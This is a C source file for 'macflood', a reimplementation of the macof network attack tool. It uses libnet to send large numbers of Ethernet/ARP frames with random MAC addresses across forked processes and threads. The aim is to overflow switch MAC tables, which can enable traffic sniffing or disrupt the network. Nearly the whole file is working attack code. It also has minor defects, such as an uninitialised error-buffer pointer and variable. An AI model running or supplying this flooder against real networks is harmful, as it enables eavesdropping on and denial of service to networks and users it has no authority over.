/*
  macflood.c

  Reimplementation of C port macof.c from PerlNet::RawIP distribution.

  Perl macof originally written by Ian Vitek <ian.vitek@infosec.se>
  C macof originally writen by Dug Song <dugsong@monkey.org>.

  Copyright (c) 2011 Steve Dierker <steve.dierker@obstkiste.org>

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  he Free Software Foundation, either version 3 of the License, or
  ())at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


#include <sys/types.h>
#include <sys/param.h>
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>
#include <pthread.h>

#include "macflood.h"

void usage() {
  fprintf(stderr, "Version: " VERSION "\n"
      "Usage macflood [-v] [-t threads] [-p process][-i interface] [-n times] \n");
  exit(1);
}

void gen_mac(u_char *mac)
{
   *((in_addr_t *)mac) = libnet_get_prand(LIBNET_PRu32);
   *((u_short *)(mac + 4)) = libnet_get_prand(LIBNET_PRu16);
}

void *macflood(void *n) {
  int32_t i,c;
  u_char smaca[ETHER_ADDR_LEN], dmaca[ETHER_ADDR_LEN];
  libnet_t *llif;
  char ebuf[PCAP_ERRBUF_SIZE];
  libnet_ptag_t pkt;
  u_int8_t *packet;
  u_int32_t packet_s;

  for(i=0; i != *(int32_t *)n; ++i) {

    // initiliaze libnet context
    if((llif=libnet_init(LIBNET_LINK_ADV, intf, ebuf))==NULL)
      errx(1, "%s", ebuf);

    // Initialize Randomgenerator
    libnet_seed_prand(llif);

    // Generate random source mac
    gen_mac(smaca);
    gen_mac(dmaca);

    //build ARP
    if ((pkt = libnet_build_arp(
            ARPHRD_ETHER,                           /* hardware addr */
            ETHERTYPE_IP,                           /* protocol addr */
            6,                                      /* hardware addr size */
            4,                                      /* protocol addr size */
            ARPOP_REQUEST,                            /* operation type */
            empty_mac,                                  /* sender hardware addr */
            (u_int8_t *)&empty_ip,                  /* sender protocol addr */
            empty_mac,
            (u_int8_t *)&empty_ip,                  /* target protocol addr */
            NULL,                                   /* payload */
            0,                                      /* payload size */
            llif,                                   /* libnet context */
            0))==-1)                                /* libnet id */
      fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(llif));

    // Build ethernet
    if ((pkt = libnet_build_ethernet(
            dmaca,                /* ethernet destination */
            smaca,                /* source macadress */
            ETHERTYPE_ARP,        /* protocol type */
            NULL,                 /* Payload */
            0,                    /* length of payload*/
            llif,                 /* libnet id */
            0))==-1)              /* ptag */
      fprintf(stderr, "Can't build ethernet header: %s\n",
        libnet_geterror(llif));

    if (libnet_adv_cull_packet(llif, &packet, &packet_s) == -1)
        fprintf(stderr, "%s", libnet_geterror(llif));

    // Write package to wire
    if ((c = libnet_write(llif))==-1)
      errx(1, "Write error: %s\n", libnet_geterror(llif));
    if(verbose)
      fprintf(stderr, "SRC-MAC: %x:%x:%x:%x:%x:%x |"
        "DST-MAC: %x:%x:%x:%x:%x:%x\n",
      smaca[0],smaca[1],smaca[2],smaca[3],smaca[4],smaca[5],
      dmaca[0], dmaca[1], dmaca[2], dmaca[3], dmaca[4], dmaca[5]);

    libnet_destroy(llif);
  }
  fprintf(stderr, "%d Packages sent.\n", *(int32_t *)n);
}

int main (int32_t argc, char *argv[]) {
  int32_t c, i;
  u_int32_t parts;
  char *ebuf;
  pthread_t *thread_id;
  pid_t pID;

  //Process cmd-line-arguments
  while ((c = getopt(argc, argv, "vrt:p:i:n:h?V")) != -1) {
      switch (c) {
      case 'v':
         verbose = 1;
         break;
      case 'i':
         intf = optarg;
         break;
      case 't':
        if(atoi(optarg)>0)
          threads = atoi(optarg);
        break;
      case 'p':
        if(atoi(optarg)>0)
          processes = atoi(optarg);
        break;
      case 'n':
         if(atoi(optarg)>0)
          repeat = atoi(optarg);
         break;
      default:
         usage();
      }
  }

  argc -= optind;
  argv += optind;

  if (argc != 0)
    usage();

  // Check if interface exists
  if (!intf && (intf = pcap_lookupdev(ebuf)) == NULL)
    errx(1, "%s", ebuf);

  // If more then one process shall work
  if(processes > 1) {
    //Divide repeat for processes
    if(repeat>0)
      parts = repeat / processes;

    //Create so many processes
    for(i = 0; i< processes; ++i) {
      // Fork Process
      pID = fork();
      if(pID == 0) {
        // stop spawning new process
        i = processes;
        // Spawn more thread if necessary
        if(threads > 0) {
          fprintf(stderr, "Threads: %d\n", threads);
          thread_id = (pthread_t *)malloc(sizeof(pthread_t)*threads);
          if(parts > 0)
            parts = parts / threads;
          for(c = 0; c < threads; ++c)
            pthread_create(&thread_id[c], NULL, macflood, &parts);
          for(c = 0; c < threads; ++c) {
            pthread_join(thread_id[c], NULL);
            fprintf(stderr, "Thread spawned!\n");
          }
        } else {
          (*macflood)(&parts);
        }
      } else if(pID < 0) {
        fprintf(stderr, "Fork failed!\n");
      } else {
        fprintf(stderr, "Processs spawned!\n");
      }
    }
  } else {
    if(threads>0) {
      thread_id = (pthread_t *)malloc(sizeof(pthread_t)*threads);
      if(repeat > 0)
        parts = repeat / threads;
      for(c = 0; c<threads; ++c)
        thread_id[c] = c;
      for(c = 0; c<threads; ++c)
        pthread_create(&thread_id[c], NULL, macflood, &parts);
      for(c = 0; c < threads; ++c) {
        pthread_join(thread_id[c], NULL);
      }
    } else {
      (*macflood)(&repeat);
    }
  }
  return (EXIT_SUCCESS);
}

